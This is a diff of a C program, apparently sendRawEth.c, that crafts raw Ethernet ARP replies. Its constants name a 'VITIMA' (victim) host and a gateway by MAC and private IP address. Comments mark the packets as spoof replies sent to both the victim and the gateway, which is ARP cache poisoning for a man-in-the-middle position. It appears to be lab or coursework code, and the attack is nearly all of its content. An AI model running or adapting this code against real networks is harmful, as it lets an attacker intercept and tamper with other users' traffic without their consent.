@@ -17,30 +17,30 @@
 #include <net/if.h>
 #include <netinet/ether.h>
 
-#define VITIMA_MAC0 0x40 //0x4c
-#define VITIMA_MAC1 0xf0 //0xed
-#define VITIMA_MAC2 0x2f //0xde
-#define VITIMA_MAC3 0x7f //0x9f
-#define VITIMA_MAC4 0x55 //0xa2
-#define VITIMA_MAC5 0xbf //0xcd
+#define VITIMA_MAC0 0xa4 //0x40 //0x4c
+#define VITIMA_MAC1 0x1f //0xf0 //0xed
+#define VITIMA_MAC2 0x72 //0x2f //0xde
+#define VITIMA_MAC3 0xf5 //0x7f //0x9f
+#define VITIMA_MAC4 0x90 //0x55 //0xa2
+#define VITIMA_MAC5 0x52 //0xbf //0xcd
 
-#define GATEWAY_MAC0 0xa0
-#define GATEWAY_MAC1 0xf3
-#define GATEWAY_MAC2 0xc1
-#define GATEWAY_MAC3 0x4f
-#define GATEWAY_MAC4 0xaa
-#define GATEWAY_MAC5 0xa0
+#define GATEWAY_MAC0 0x00 //0xa0
+#define GATEWAY_MAC1 0x01 //0xf3
+#define GATEWAY_MAC2 0x02 //0xc1
+#define GATEWAY_MAC3 0x23 //0x4f
+#define GATEWAY_MAC4 0xea //0xaa
+#define GATEWAY_MAC5 0xa6 //0xa0
 
 //ROUTER <--> sendRawEth.c <--> DEST
-#define GATEWAY_IP0 192
-#define GATEWAY_IP1 168
-#define GATEWAY_IP2 1
+#define GATEWAY_IP0 10  //192
+#define GATEWAY_IP1 32  //168
+#define GATEWAY_IP2 143 //1
 #define GATEWAY_IP3 1
 
-#define VITIMA_IP0 192
-#define VITIMA_IP1 168
-#define VITIMA_IP2 1
-#define VITIMA_IP3 102
+#define VITIMA_IP0 10  //192
+#define VITIMA_IP1 32  //168
+#define VITIMA_IP2 143 //1
+#define VITIMA_IP3 183 //102
 
 #define ETHER_TYPE	0x0800
 
@@ -137,12 +137,13 @@ int main(int argc, char *argv[])
 	uint8_t sendbuf[BUF_SIZ];
 	struct ether_header *eh = (struct ether_header *) sendbuf;
 	struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
-  struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header));
+    struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header));
 	struct sockaddr_ll socket_address;
 	char ifName[IFNAMSIZ];
-  uint8_t sender_ip[4]  = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
-  uint8_t target_ip[4]  = {VITIMA_IP0, VITIMA_IP1, VITIMA_IP2, VITIMA_IP3};
-  uint8_t target_mac[6] = {VITIMA_MAC0, VITIMA_MAC1, VITIMA_MAC2, VITIMA_MAC3, VITIMA_MAC4,VITIMA_MAC5};
+    uint8_t sender_ip[4]  = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
+    uint8_t target_ip[4]  = {VITIMA_IP0, VITIMA_IP1, VITIMA_IP2, VITIMA_IP3};
+    uint8_t target_mac[6] = {VITIMA_MAC0, VITIMA_MAC1, VITIMA_MAC2, VITIMA_MAC3, VITIMA_MAC4,VITIMA_MAC5};
+    uint8_t fake_mac[6] = {VITIMA_MAC0, VITIMA_MAC1, VITIMA_MAC2, VITIMA_MAC3, VITIMA_MAC4,0xba};
 
 	/* Get interface name */
 	if (argc > 1)
@@ -182,9 +183,9 @@ int main(int argc, char *argv[])
 	eh->ether_dhost[4] = VITIMA_MAC4;
 	eh->ether_dhost[5] = VITIMA_MAC5;
 	/* Ethertype field */
-  eh->ether_type = htons(ETH_P_ARP);
+    eh->ether_type = htons(ETH_P_ARP);
 	tx_len += sizeof(struct ether_header);
-  /* Index of the network device */
+    /* Index of the network device */
 	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	/* Address length*/
 	socket_address.sll_halen = ETH_ALEN;
@@ -198,15 +199,16 @@ int main(int argc, char *argv[])
 
   tx_len += sizeof(struct arp_packet);
 
-  /* Sending Request first */
-  fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
+  /* Sending Spoof Reply to VITIMA */
+  //fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
+  //fill_arp(arp_payload,2,fake_mac,sender_ip,target_mac,target_ip);
   print_arp(arp_payload);
   if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 	    printf("Send failed\n");
 
   sleep(1);
 
-  /* Sending the reply to GATEWAY*/
+  /* Sending sppof reply to GATEWAY*/
   sender_ip[0] = VITIMA_IP0;
   sender_ip[1] = VITIMA_IP1;
   sender_ip[2] = VITIMA_IP2;
@@ -222,21 +224,21 @@ int main(int argc, char *argv[])
   target_ip[2] = GATEWAY_IP2;
   target_ip[3] = GATEWAY_IP3;
   eh->ether_dhost[0] = GATEWAY_MAC0;
-	eh->ether_dhost[1] = GATEWAY_MAC1;
-	eh->ether_dhost[2] = GATEWAY_MAC2;
-	eh->ether_dhost[3] = GATEWAY_MAC3;
-	eh->ether_dhost[4] = GATEWAY_MAC4;
-	eh->ether_dhost[5] = GATEWAY_MAC5;
-	socket_address.sll_addr[0] = GATEWAY_MAC0;
-	socket_address.sll_addr[1] = GATEWAY_MAC1;
-	socket_address.sll_addr[2] = GATEWAY_MAC2;
-	socket_address.sll_addr[3] = GATEWAY_MAC3;
-	socket_address.sll_addr[4] = GATEWAY_MAC4;
-	socket_address.sll_addr[5] = GATEWAY_MAC5;
+  eh->ether_dhost[1] = GATEWAY_MAC1;
+  eh->ether_dhost[2] = GATEWAY_MAC2;
+  eh->ether_dhost[3] = GATEWAY_MAC3;
+  eh->ether_dhost[4] = GATEWAY_MAC4;
+  eh->ether_dhost[5] = GATEWAY_MAC5;
+  socket_address.sll_addr[0] = GATEWAY_MAC0;
+  socket_address.sll_addr[1] = GATEWAY_MAC1;
+  socket_address.sll_addr[2] = GATEWAY_MAC2;
+  socket_address.sll_addr[3] = GATEWAY_MAC3;
+  socket_address.sll_addr[4] = GATEWAY_MAC4;
+  socket_address.sll_addr[5] = GATEWAY_MAC5;
   fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
   print_arp(arp_payload);
   if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 	    printf("Send failed\n");
 
-	return 0;
+  return 0;
 }
